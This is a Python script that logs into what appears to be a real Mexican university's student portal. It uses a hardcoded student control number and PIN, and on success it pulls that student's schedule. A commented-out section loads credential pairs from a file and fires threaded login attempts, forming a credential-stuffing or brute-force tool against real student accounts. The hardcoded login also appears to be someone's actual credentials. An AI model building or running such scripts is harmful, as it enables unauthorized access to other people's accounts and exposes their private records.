import requests
from bs4 import BeautifulSoup
import threading


# Define the URL of the login page
login_url = "https://sii.itq.edu.mx/sistema/index.php"
control_number = 20140936
nip = 8194
session = requests.Session()

    # Prepare the data for the POST request
data = {
        "no_de_control": control_number,
        "password": nip,
    }

    # Send a POST request to the login page
response = session.post(login_url, data=data)
print(response.text)
if "modulos/alu/" in response.text:
    #print(response.text)
    response2 = session.post("https://sii.itq.edu.mx/sistema/modulos/cons/alumnos/horario.php")
    #print(response2.text)
    print(f"{control_number}: Hee Hee")
        #soup = BeautifulSoup(response2.text, 'html.parser')
        #student_name_td = soup.find('td', text=(control_number + '  '))
        #print(f"{control_number} is logged in.")
        #if student_name_td:
        #    student_name = student_name_td.find_next('td').get_text()
        #    print(f"{student_name} is logged in.")
else:    
    
    print(f"Login failed for control number {control_number}.")

# Read usernames and passwords from the file
#with open("supremepower.txt", "r") as file:
#    lines = file.readlines()

# Create threads for each login attempt
#threads = []
#for line in lines:
#    control_number, nip = line.strip().split(':')
#    thread = threading.Thread(target=login_and_get_name, args=(control_number, nip))
#    threads.append(thread)

# Start all threads
#for thread in threads:
#    thread.start()

# Wait for all threads to finish
#for thread in threads:
#    thread.join()